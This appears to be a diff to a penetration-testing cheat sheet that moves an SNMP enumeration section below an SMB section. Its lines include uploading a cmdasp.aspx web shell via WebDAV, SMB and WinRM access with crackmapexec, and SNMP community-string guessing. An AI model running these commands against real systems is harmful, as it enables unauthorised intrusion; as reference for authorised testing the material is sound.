@@ -128,16 +128,7 @@ dav:/ put cmdasp.aspx cmdasp.txt
 dav:/ put cmdasp.txt cmdasp.aspx
 ```
 
-- SNMP (udp/port 161)
-
-```
-$ snmpwalk -v 2c -c <community string> <IP address>
-$ snmpwalk -v 2c -c public <IP address> 1.3.6.1.2.1.1.5.0
-$ snmpwalk -v 2c -c private <IP address> 1.3.6.1.2.1.1.5.0
-$ onesixtyone -c dict.txt <IP address>
-```
-
-- SMB (port 445)
+- SMB (port 137/139/445)
 
 ```
 $ smbclient -L <IP address>
@@ -155,6 +146,15 @@ $ enum4linux -a <IP address>
 $ crackmapexec smb <IP address> --shares
 $ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
 $ crackmapexec winrm <IP address> -u <username> -p '<password>'
+```
+
+- SNMP (udp/port 161)
+
+```
+$ snmpwalk -v 2c -c <community string> <IP address>
+$ snmpwalk -v 2c -c public <IP address> 1.3.6.1.2.1.1.5.0
+$ snmpwalk -v 2c -c private <IP address> 1.3.6.1.2.1.1.5.0
+$ onesixtyone -c dict.txt <IP address>
 ```
 
 - CUPS (port 631)
